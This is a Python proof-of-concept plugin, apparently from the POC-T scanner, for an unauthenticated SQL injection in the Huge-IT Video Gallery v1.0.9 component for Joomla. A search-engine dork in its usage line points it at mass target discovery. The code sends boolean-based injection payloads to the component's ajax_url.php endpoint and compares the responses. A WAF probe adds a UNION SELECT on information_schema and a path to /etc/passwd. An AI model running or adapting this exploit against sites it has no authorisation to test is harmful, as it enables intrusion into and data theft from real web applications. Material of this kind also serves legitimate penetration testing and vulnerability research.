#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
Unauthenticated SQL Injection in Huge-IT Video Gallery v1.0.9 for Joomla

Type
  boolean-based & time-based-blind
Usage
  python POC-T.py -s joomla-videogallerylite-sqli -aG "inurl:/com_videogallerylite/ajax_url.php"

"""

import requests
from plugin.urlparser import iterate_path, get_domain
from plugin.useragent import firefox

CHECK_WAF = True


def poc(url):
    target = get_entry(url)
    if not target:
        return False

    if CHECK_WAF and has_waf(target):
        return '[Uncertain,WAF detected!] ' + get_domain(target)

    data_temp = "page=1&galleryid=[P]&task=load_videos_content&perpage=20&linkbutton=2"

    # Content-Type needed
    headers = {'User-Agent': firefox(),
               'Content-Type': 'application/x-www-form-urlencoded'}
    try:
        r1 = requests.post(target, headers=headers, data=data_temp.replace('[P]', '-1 OR 1=1'))
        r2 = requests.post(target, headers=headers, data=data_temp.replace('[P]', '-1 OR 1=2'))
    except:
        return False
    if r1.status_code == r2.status_code == 200 and len(r1.content) != len(r2.content):
        return True
    return False


def get_entry(url):
    url = url.split('?')[0]
    if '://' not in url:
        url = 'http://' + url
    entry = "/components/com_videogallerylite/ajax_url.php"
    for each in iterate_path(url):
        target = each.rstrip('/') + entry
        try:
            r = requests.get(target, timeout=10)
        except:
            continue
        if r.status_code == 200 and len(r.content) < 10:
            return target
    return None


def has_waf(target):
    # Check if target has a WAF/IDS
    check_waf_payload = '?p=-1 OR 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables WHERE 2>1-- ../../../etc/passwd'
    try:
        r_waf = requests.get(target + check_waf_payload, timeout=3)
    except:
        return False
    if len(r_waf.content) > 10 or r_waf.status_code != 200:
        return True
    return False
